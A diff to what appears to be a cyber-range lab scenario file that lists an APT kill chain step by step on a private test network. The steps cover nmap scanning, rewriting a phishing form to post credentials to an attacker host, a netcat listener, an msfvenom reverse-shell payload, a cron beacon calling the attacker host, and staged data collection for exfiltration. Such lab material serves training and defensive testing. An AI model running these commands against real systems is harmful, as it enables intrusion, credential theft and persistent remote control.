@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: 10.20.30.
     field: stdout
+  target_vm: attacker
   script: nmap -sS -T2 10.20.30.0/24
   risk_level: low
 - order: 2
@@ -36,6 +37,7 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+  target_vm: attacker
   script: nmap -sV -O -sC 10.20.30.80
   risk_level: low
 - order: 3
@@ -49,6 +51,7 @@ steps:
     type: output_contains
     expect: VULNERABLE
     field: stdout
+  target_vm: attacker
   script: nmap --script vuln -p 80,443,3000 10.20.30.80
   risk_level: low
 - order: 4
@@ -62,6 +65,7 @@ steps:
     type: output_contains
     expect: phish_template.html
     field: stdout
+  target_vm: attacker
   script: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/
   risk_level: medium
 - order: 5
@@ -75,6 +79,7 @@ steps:
     type: output_contains
     expect: 10.20.30.201:4444
     field: stdout
+  target_vm: attacker
   script: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
   risk_level: medium
 - order: 6
@@ -89,6 +94,7 @@ steps:
     type: output_contains
     expect: listening
     field: stdout
+  target_vm: attacker
   script: nc -lvnp 4444 &
   risk_level: medium
 - order: 7
@@ -102,6 +108,7 @@ steps:
     type: output_contains
     expect: payload.elf
     field: stdout
+  target_vm: attacker
   script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/payload.elf
   risk_level: medium
 - order: 8
@@ -115,6 +122,7 @@ steps:
     type: output_contains
     expect: /bin/sh
     field: stdout
+  target_vm: attacker
   script: sha256sum /tmp/payload.elf && strings /tmp/payload.elf
   risk_level: low
 - order: 9
@@ -128,6 +136,7 @@ steps:
     type: output_contains
     expect: beacon
     field: stdout
+  target_vm: attacker
   script: (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon') | crontab -
   risk_level: medium
 - order: 10
@@ -141,6 +150,7 @@ steps:
     type: output_contains
     expect: beacon
     field: stdout
+  target_vm: attacker
   script: crontab -l && grep -i cron /var/log/syslog | tail -20
   risk_level: low
 - order: 11
@@ -155,6 +165,7 @@ steps:
     type: output_contains
     expect: whoami
     field: stdout
+  target_vm: attacker
   script: export PAYLOAD=$(echo 'whoami && id && hostname' | base64) && echo $PAYLOAD | base64 -d
   risk_level: medium
 - order: 12
@@ -168,6 +179,7 @@ steps:
     type: output_contains
     expect: saved
     field: stdout
+  target_vm: attacker
   script: wget -r -l 2 -P /tmp/mirror http://10.20.30.80:3000/ 2>&1 | tail -5
   risk_level: low
 - order: 13
@@ -182,6 +194,7 @@ steps:
     type: output_contains
     expect: exfil
     field: stdout
+  target_vm: attacker
   script: cat /etc/hostname > /tmp/exfil_data.txt && uname -a >> /tmp/exfil_data.txt && ip addr >> /tmp/exfil_data.txt && echo '=== Collected data ===' && wc -l /tmp/exfil_data.txt && echo '=== DNS exfil
     simulation (base64 chunks) ===' && cat /tmp/exfil_data.txt | base64 -w 63 | head -5
   risk_level: medium
@@ -198,6 +211,7 @@ steps:
     type: output_contains
     expect: Kill Chain Report
     field: stdout
+  target_vm: attacker
   script: 'crontab -l | grep -v beacon | crontab - && rm -f /tmp/payload.elf /tmp/exfil_data.txt && echo -e ''=== APT Kill Chain Report ===\n1. Recon: nmap stealth scan (T1595)\n2. Weaponization: msfvenom
     payload (T1587)\n3. Delivery: phishing template (T1566)\n4. Exploitation: reverse shell (T1059)\n5. Installation: crontab persistence (T1053.003)\n6. C2: netcat listener (T1071)\n7. Actions: data collection
     & DNS exfil (T1005, T1048.003)'' > /tmp/killchain_report.txt && cat /tmp/killchain_report.txt'
